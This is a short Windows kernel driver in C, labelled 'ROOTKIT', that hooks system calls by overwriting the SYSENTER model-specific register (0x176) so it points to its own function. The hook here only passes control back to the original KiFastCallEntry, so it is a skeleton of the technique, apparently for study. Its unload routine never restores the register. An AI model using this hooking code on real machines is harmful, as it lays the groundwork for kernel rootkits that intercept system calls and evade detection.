#include "ntddk.h"

ULONG d_origKiFastCallEntry; // Original value of ntoskrnl!KiFastCallEntry

VOID OnUnload( IN PDRIVER_OBJECT DriverObject )
{
	DbgPrint("ROOTKIT: OnUnload called\n");
}

// Hook function
__declspec(naked) MyKiFastCallEntry()
{
	__asm {
		jmp [d_origKiFastCallEntry]
	}
}

NTSTATUS DriverEntry( IN PDRIVER_OBJECT theDriverObject, IN PUNICODE_STRING theRegistryPath )
{
	theDriverObject->DriverUnload  = OnUnload; 

	__asm {
        mov ecx, 0x176
		rdmsr                          // read the value of the IA32_SYSENTER_EIP register
		mov d_origKiFastCallEntry, eax
		mov eax, MyKiFastCallEntry     // Hook function address
		wrmsr                          // Write to the IA32_SYSENTER_EIP register
	}

	return STATUS_SUCCESS;
}

